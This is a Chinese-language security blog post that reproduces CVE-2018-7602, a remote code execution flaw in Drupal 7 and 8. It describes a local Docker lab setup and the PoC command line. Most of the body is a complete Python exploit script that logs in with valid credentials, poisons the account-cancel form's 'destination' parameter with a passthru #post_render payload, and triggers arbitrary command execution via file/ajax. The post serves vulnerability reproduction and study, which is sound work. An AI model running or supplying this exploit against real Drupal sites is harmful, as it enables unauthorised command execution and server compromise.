<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-7602）Drupal 远程代码执行漏洞一、漏洞简介Drupal7.x版本和8.x版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。 二、漏洞影响Drupal 7.x版本和8.x 三、复现过程漏洞环境执行如下命令启动drupal 7.57的环境： docker-compose up -d  环境启动后，访问 http:&#x2F;&#x2F;your-ip:8081&#x2F;将会看到d">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Drupal/%EF%BC%88CVE-2018-7602%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-7602）Drupal 远程代码执行漏洞一、漏洞简介Drupal7.x版本和8.x版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。 二、漏洞影响Drupal 7.x版本和8.x 三、复现过程漏洞环境执行如下命令启动drupal 7.57的环境： docker-compose up -d  环境启动后，访问 http:&#x2F;&#x2F;your-ip:8081&#x2F;将会看到d">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-7602)Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="article:published_time" content="2022-07-08T06:25:55.109Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2018-7602)Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Drupal/（CVE-2018-7602）Drupal 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2018-7602%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:55.109Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-7602）Drupal-远程代码执行漏洞"><a href="#（CVE-2018-7602）Drupal-远程代码执行漏洞" class="headerlink" title="（CVE-2018-7602）Drupal 远程代码执行漏洞"></a>（CVE-2018-7602）Drupal 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Drupal<br>7.x版本和8.x版本中的存在存在远程代码执行漏洞。远程攻击者可利用该中断执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Drupal 7.x版本和8.x</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>执行如下命令启动drupal 7.57的环境：</p>
<pre><code>docker-compose up -d
</code></pre>
<p>环境启动后，访问 <code>http://your-ip:8081/</code><br>将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2018-7600">ianxtianxt/CVE-2018-7602</a>的PoC。</p>
<p>如下图所示，执行以下命令即可复现该漏洞。示例命令为<br><code>id</code>，如图红框中显示，可以执行该命令。</p>
<pre><code># &quot;id&quot;为要执行的命令 第一个drupal为用户名 第二个drupal为密码
python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; drupal drupal http://127.0.0.1:8081/
</code></pre>
<p><img src="/resource/(CVE-2018-7602)Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
<h3 id="CVE-2018-7602-py"><a href="#CVE-2018-7602-py" class="headerlink" title="CVE-2018-7602.py"></a>CVE-2018-7602.py</h3><pre><code>#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7602.py&quot;,
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= &#39;&#39;&#39;
                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58
                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) 
                    with the &#39;destination&#39; variable and triggering it with the upload file via ajax (/file/ajax).
                    &#39;&#39;&#39;)

  parser.add_argument(&quot;user&quot;, help=&quot;Username&quot;)
  parser.add_argument(&quot;password&quot;, help=&quot;Password&quot;)
  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)
  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)
  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)
  parser.add_argument(&quot;-x&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)
  args = parser.parse_args()
  return args

def pwn_target(target, username, password, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  session = requests.Session()
  proxyConf = &#123;&#39;http&#39;: proxy, &#39;https&#39;: proxy&#125;
  try:
    print(&#39;[*] Creating a session using the provided credential...&#39;)
    get_params = &#123;&#39;q&#39;:&#39;user/login&#39;&#125;
    post_params = &#123;&#39;form_id&#39;:&#39;user_login&#39;, &#39;name&#39;: username, &#39;pass&#39; : password, &#39;op&#39;:&#39;Log in&#39;&#125;
    print(&#39;[*] Finding User ID...&#39;)
    session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    get_params = &#123;&#39;q&#39;:&#39;user&#39;&#125;
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    user_id = soup.find(&#39;meta&#39;, &#123;&#39;property&#39;: &#39;foaf:name&#39;&#125;).get(&#39;about&#39;)
    if (&quot;?q=&quot; in user_id):
      user_id = user_id.split(&quot;=&quot;)[1]
    if(user_id):
      print(&#39;[*] User ID found: &#39; + user_id)
    print(&#39;[*] Poisoning a form using \&#39;destination\&#39; and including it in cache.&#39;)
    get_params = &#123;&#39;q&#39;: user_id + &#39;/cancel&#39;&#125;
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    form = soup.find(&#39;form&#39;, &#123;&#39;id&#39;: &#39;user-cancel-confirm-form&#39;&#125;)
    form_token = form.find(&#39;input&#39;, &#123;&#39;name&#39;: &#39;form_token&#39;&#125;).get(&#39;value&#39;)
    get_params = &#123;&#39;q&#39;: user_id + &#39;/cancel&#39;, &#39;destination&#39; : user_id +&#39;/cancel?q[%23post_render][]=&#39; + function + &#39;&amp;q[%23type]=markup&amp;q[%23markup]=&#39; + command &#125;
    post_params = &#123;&#39;form_id&#39;:&#39;user_cancel_confirm_form&#39;,&#39;form_token&#39;: form_token, &#39;_triggering_element_name&#39;:&#39;form_id&#39;, &#39;op&#39;:&#39;Cancel account&#39;&#125;
    r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    form = soup.find(&#39;form&#39;, &#123;&#39;id&#39;: &#39;user-cancel-confirm-form&#39;&#125;)
    form_build_id = form.find(&#39;input&#39;, &#123;&#39;name&#39;: &#39;form_build_id&#39;&#125;).get(&#39;value&#39;)
    if form_build_id:
        print(&#39;[*] Poisoned form ID: &#39; + form_build_id)
        print(&#39;[*] Triggering exploit to execute: &#39; + command)
        get_params = &#123;&#39;q&#39;:&#39;file/ajax/actions/cancel/#options/path/&#39; + form_build_id&#125;
        post_params = &#123;&#39;form_build_id&#39;:form_build_id&#125;
        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
        parsed_result = r.text.split(&#39;[&#123;&quot;command&quot;:&quot;settings&quot;&#39;)[0]
        print(parsed_result)
  except:
    print(&quot;ERROR: Something went wrong.&quot;)
    raise

def main():
  print ()
  print (&#39;===================================================================================&#39;)
  print (&#39;|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |&#39;)
  print (&#39;|                                   by pimps                                      |&#39;)
  print (&#39;===================================================================================\n&#39;)

  args = get_args() # get the cl args
  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == &#39;__main__&#39;:
  main()
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://vulhub.org//#/environments/drupal/CVE-2018-7602/">https://vulhub.org/\#/environments/drupal/CVE-2018-7602/</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Drupal/%EF%BC%88CVE-2018-7602%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qo4e005fy8v18cyfhv4x" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2019-6339%EF%BC%89Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Drupal/%EF%BC%88CVE-2018-7600%EF%BC%89Drupal%20Drupalgeddon%202%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>